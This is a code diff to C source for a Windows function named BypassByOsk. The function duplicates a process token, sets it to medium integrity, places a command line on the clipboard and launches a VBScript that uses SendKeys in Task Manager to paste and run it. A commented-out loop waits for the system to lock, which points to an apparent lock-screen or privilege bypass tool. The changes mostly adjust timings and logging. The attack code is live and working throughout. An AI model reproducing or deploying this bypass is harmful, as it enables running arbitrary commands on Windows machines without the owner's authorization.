@@ -13,7 +13,7 @@ BOOL BypassByOsk
 	TOKEN_MANDATORY_LABEL TokenInfo;
 	PSID pSid = NULL;
 	LPWSTR lpTempPath = NULL;
-	CHAR szVbsContent[] = "Set troll = WScript.CreateObject(\"WScript.Shell\")\ntroll.Run \"taskmgr.exe\"\nWScript.Sleep 50\ntroll.SendKeys \"%\"\nWScript.Sleep 50\ntroll.SendKeys \"{F}\"\nWScript.Sleep 50\ntroll.SendKeys \"{ENTER}\"\nWScript.Sleep 50\ntroll.SendKeys \"^v\"\ntroll.SendKeys \"{TAB}\"\nWScript.Sleep 50\ntroll.SendKeys \"{+}\"\nWScript.Sleep 50\ntroll.SendKeys \"{ENTER}\"\nWScript.Sleep 50\ntroll.AppActivate(\"Task Manager\")\ntroll.SendKeys \"%{f4}\"";
+	CHAR szVbsContent[] = "Set troll = WScript.CreateObject(\"WScript.Shell\")\ntroll.Run \"taskmgr.exe\"\nWScript.Sleep 500\ntroll.SendKeys \"%\"\nWScript.Sleep 500\ntroll.SendKeys \"{F}\"\nWScript.Sleep 50\ntroll.SendKeys \"{ENTER}\"\nWScript.Sleep 500\ntroll.SendKeys \"^v\"\ntroll.SendKeys \"{TAB}\"\nWScript.Sleep 500\ntroll.SendKeys \"{+}\"\nWScript.Sleep 500\ntroll.SendKeys \"{ENTER}\"\nWScript.Sleep 500\ntroll.AppActivate(\"Task Manager\")\ntroll.SendKeys \"%{f4}\"";
 	LPWSTR lpCscriptCommandLine = NULL;
 	STARTUPINFOW si;
 	PROCESS_INFORMATION pi;
@@ -29,7 +29,7 @@ BOOL BypassByOsk
 	sei.fMask |= SEE_MASK_NOCLOSEPROCESS;
 
 	if (!ShellExecuteExW(&sei)) {
-		wprintf(L"CreateProcessW failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LogError(L"CreateProcessW failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
 		goto CLEANUP;
 	}
 
@@ -37,18 +37,18 @@ BOOL BypassByOsk
 	CloseHandle(sei.hProcess);
 	hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_TERMINATE, TRUE, dwPid);
 	if (hProc == NULL) {
-		wprintf(L"OpenProcess failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LogError(L"OpenProcess failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
 		goto CLEANUP;
 	}
 
 	if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
-		wprintf(L"OpenProcessToken failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LogError(L"OpenProcessToken failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
 		goto CLEANUP;
 	}
 
 	RtlSecureZeroMemory(&sa, sizeof(sa));
 	if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, &sa, SecurityImpersonation, TokenPrimary, &hDuplicatedToken)) {
-		wprintf(L"DuplicateTokenEx failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LogError(L"DuplicateTokenEx failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
 		goto CLEANUP;
 	}
 
@@ -56,7 +56,7 @@ BOOL BypassByOsk
 	ConvertStringSidToSidW(SDDL_ML_MEDIUM, &pSid);
 	TokenInfo.Label.Sid = pSid;
 	if (!SetTokenInformation(hDuplicatedToken, TokenIntegrityLevel, &TokenInfo, sizeof(TokenInfo))) {
-		wprintf(L"SetTokenInformation failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LogError(L"SetTokenInformation failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
 		goto CLEANUP;
 	}
 
@@ -67,7 +67,7 @@ BOOL BypassByOsk
 
 	hMem = GlobalAlloc(GMEM_MOVEABLE, (lstrlenA(lpCommandLine) + 1) * sizeof(WCHAR));
 	if (hMem == NULL) {
-		wprintf(L"GlobalAlloc failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LogError(L"GlobalAlloc failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
 		goto CLEANUP;
 	}
 
@@ -77,17 +77,17 @@ BOOL BypassByOsk
 	lpGlobalMem[lstrlenW(lpGlobalMem)] = L'\0';
 	GlobalUnlock(hMem);
 	if (!OpenClipboard(NULL)) {
-		wprintf(L"OpenClipboard failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LogError(L"OpenClipboard failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
 		goto CLEANUP;
 	}
 
 	if (!EmptyClipboard()) {
-		wprintf(L"EmptyClipboard failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LogError(L"EmptyClipboard failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
 		goto CLEANUP;
 	}
 
 	if (!SetClipboardData(CF_UNICODETEXT, hMem)) {
-		wprintf(L"SetClipboardData failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LogError(L"SetClipboardData failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
 		goto CLEANUP;
 	}
 
@@ -98,8 +98,8 @@ BOOL BypassByOsk
 	RtlSecureZeroMemory(&si, sizeof(si));
 	RtlSecureZeroMemory(&pi, sizeof(pi));
 	si.cb = sizeof(si);
-	if (!CreateProcessAsUserW(hDuplicatedToken, NULL, lpCscriptCommandLine, &sa, &sa, FALSE, 0, NULL, NULL, &si, &pi)) {
-		wprintf(L"CreateProcessAsUserW failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+	if (!CreateProcessAsUserW(hDuplicatedToken, NULL, lpCscriptCommandLine, &sa, &sa, TRUE, 0, NULL, NULL, &si, &pi)) {
+		LogError(L"CreateProcessAsUserW failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
 		goto CLEANUP;
 	}
 
@@ -146,25 +146,4 @@ CLEANUP:
 	}
 
 	return Result;
-}
-
-VOID WaitAndBypass
-(
-	_In_ LPSTR lpCommandLine
-)
-{
-	BypassByOsk(lpCommandLine);
-
-	/*while (TRUE) {
-		if (IsSystemLock()) {
-			if (BypassByOsk(lpCommandLine)) {
-				wprintf(L"BypassByOsk() is ok\n");
-				break;
-			}
-
-			wprintf(L"BypassByOsk() is not ok\n");
-		}
-
-		Sleep(2000);
-	}*/
 }
